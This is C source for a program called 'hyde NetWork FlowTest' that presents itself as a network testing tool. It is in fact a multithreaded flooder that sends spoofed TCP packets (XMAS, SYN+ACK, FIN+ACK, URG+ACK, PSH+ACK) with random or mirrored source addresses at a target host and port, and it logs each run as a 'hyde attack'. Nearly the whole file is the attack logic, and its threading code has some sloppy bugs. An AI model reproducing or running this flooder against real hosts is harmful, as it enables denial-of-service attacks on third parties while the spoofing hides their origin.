/*
        ..::hyde:NetWork:FlowTest::..
 *  jUsT Another Tool to Test your NetWork
  "follow this:",
  "./code HOST PORT Number_Packets_to_send TYPE threads",
  " 0 - XMAS with Spoofing",
  " 1 - SYN+ACK with Spoofing",
  " 2 - SYN+ACK with Mirror Spoofing",
  " 3 - FIN+ACK with Spoofing",
  " 4 - FIN+ACK with Mirror Spoofing",
  " 5 - URG+ACK with Spoofing",
  " 6 - URG+ACK With Mirror Spoofing",
  " 7 - PSH+ACK With Spoofing",
  " 8 - XMAS with Mirror Spoofing",
  "ex: ./code www.server.com 80 20000 4 5",
  "..::hyde:NetWork:FlowTest::..v 0.1",

Author: Cooler_
E-mail: c00f3r[at]gmail[dot]com
date: 17/03/2010

 
*/
#include <limits.h>
#include <ctype.h>
#include <stdio.h>    
#include <stdlib.h> 
#include <string.h>    
#include <unistd.h>    
#include <sys/time.h>    
// socks
#include <netdb.h>      
#include <sys/socket.h>    
#include <arpa/inet.h>    
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>  
#include <stdbool.h>
#include "validate.h"
#include "raw_socket.h"
#include "mem_ops.h"

// pthread Header
#include <pthread.h>
       
   
void help()
{
 puts(
  "follow this:\n"
  "./code HOST PORT Number_Packets TYPE Threads\n"
  " 0 - XMAS with Spoofing\n"
  " 1 - SYN+ACK with Spoofing\n"
  " 2 - SYN+ACK with Mirror Spoofing\n"
  " 3 - FIN+ACK with Spoofing\n"
  " 4 - FIN+ACK with Mirror Spoofing\n"
  " 5 - URG+ACK with Spoofing\n"
  " 6 - URG+ACK With Mirror Spoofing\n"
  " 7 - PSH+ACK With Spoofing\n"
  " 8 - XMAS with Mirror Spoofing\n"
  "ex: ./code www.server.com 80 20000 4 50\n"
  "..::hyde:NetWork:FlowTest::.. \n"
  "Coded by Cooler_ c00f3r[at]gmail[dot]com\n"
 );
}


int main(int argc, char *argv[]) 
{
	char IP[16];
	char *destino=NULL;
	in_addr_t remetente;
	void * addr_ptr = NULL;
	addr_ptr = &remetente;
	char addr_str[256];

	int port=80;     
	int escolha=0,filhos=0,count=0,number=500;
 	int8_t rc1;
 	srand(time(NULL));

	if(argc < 6) 
 	{
  		help();    
  		exit(0);    
 	}    

	if(strnlen(argv[1],33)==33)
	{
		DEBUG("Don't try exploit it, champion !\n");
		exit(1);
	}

 	if(!orion_getHostByName(argv[1],IP))
 	{
  		DEBUG("orion_gethostbyname() failed");
  		exit(1);
 	}

  	fprintf(stdout,"\nIP: %s \n",IP);
     
  	if(argc >= 3)
  	{ 

   		if(is_valid_int(argv[2])==false)
   		{
			DEBUG("dont try integer overflow");
			exit(1);	
   		}


   		port = atoi(argv[2]); 

   		if(!(port<=65535&& port>0)) 
    			DEBUG("error in port");
  	} 
 
  	if(argc >= 4)
  	{ 

   		if(is_valid_int(argv[3])==false)
   		{
			DEBUG("dont try integer overflow");
			exit(1);	
   		}

   		number = atoi(argv[3]);
  	}


  	if(argc >= 5) 
  	{


   		if(is_valid_int(argv[4])==false)
   		{
			DEBUG("dont try integer overflow");
			exit(1);	
   		}

   		escolha = atoi(argv[4]);

   		if(escolha<0 || escolha > 8)
    			DEBUG("please choice a true option");
  	}	       

  	if(argc >= 6)
  	{ 


   		if(is_valid_int(argv[5])==false)
   		{
			DEBUG("dont try integer overflow");
			exit(1);	
   		}

   		filhos = atoi(argv[5]);  
   		if(filhos<=0)
    			DEBUG("set number of threads please");       
  	}

  	if(filhos<2) 
   		filhos = 2;    
    
  	fprintf(stdout,"fate  : %s\n",argv[1]);    
  	fprintf(stdout,"Port         : %u\n",port);    
  	fprintf(stdout,"threads         : %u\n",filhos);
  	fprintf(stdout,"Number of times: %d\n\n", number); 
     
	destino=(char *)xmalloc(sizeof(IP));  
	strncpy(destino,IP, (sizeof(IP)) );

	switch(escolha)
	{

	    case 0: 
	     puts("Type: XMAS with Spoofing");
	     break;

	    case 1:
	     puts("Type: SYN+ACK with Spoofing");   
	     break;

	    case 2: 
	     puts("Type: SYN+ACK with Mirror Spoofing");
	     break;
 
	    case 3: 
	     puts("Type: FIN+ACK with Spoofing");
	     break;

	    case 4: 
	     puts("Type: FIN+ACK with Mirror Spoofing");
	     break;

	    case 5: 
	     puts("Type: URG+ACK with Spoofing");
	     break;

	    case 6: 
	     puts("Type: URG+ACK with Mirror Spoofing");
	     break;

	    case 7: 
	     puts("Type: PSH+ACK with Spoofing");
	     break;

	    case 8: 
	     puts("Type: XMAS with Mirror Spoofing");
	     break;
  	}  

   	pthread_t *thread;
   	thread=(pthread_t *)xmalloc(sizeof(pthread_t)*filhos+1);

// pack to pass to void pointer
   	char **ThreadArgv;
   	ThreadArgv=(char **)xmalloc(4*sizeof(char *));
   	char *StrPort=(char *)xmalloc(sizeof(char)*6);
   	snprintf( StrPort,5,"%d",  port);
   	ThreadArgv[2]=StrPort;
   	ThreadArgv[3]=StrPort;
   	char *StrChoice=(char *)xmalloc(sizeof(char)*3);
   	snprintf( StrChoice,3,"%d", escolha);
   	ThreadArgv[4]=StrChoice;

	while(number) 
	{  
		if( (!(escolha&1))&&(escolha) )
		{
// packing arguments 2 function
     			ThreadArgv[0]=destino;
     			ThreadArgv[1]=destino;
     			fprintf(stdout,"hyde attack %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
// start thread
      			if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
       				DEBUG("error in thread %d",count);
     
			if(count==filhos)
			{
      				while(count)
      				{
       					pthread_join(thread[count],NULL);
       					count--;
      				}
     			}

     			number--;
     			count++;

    		} else { 
// packing arguments 2 function
     			remetente=RandomIp();
     			inet_ntop (AF_INET, addr_ptr, addr_str, 256);
     			ThreadArgv[0]=addr_str;
     			ThreadArgv[1]=destino;
     			fprintf(stdout,"hyde attack %s in port %u, spoofing %s in port %u\n", destino, port, addr_str, port);   
// start thread
      			if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
       				DEBUG("error in thread %d",count);
     
     			if(count==filhos)
     			{
      				while(count)
      				{
       					pthread_join(thread[count],NULL);
       					count--;
      				}
     			}
     			number--; 
     			count++;   
    		}

 	}

 	XFREE(thread);
 	XFREE(destino);
 	XFREE(ThreadArgv);
 	XFREE(StrPort);
 	XFREE(StrChoice);

 	exit(0);
}    


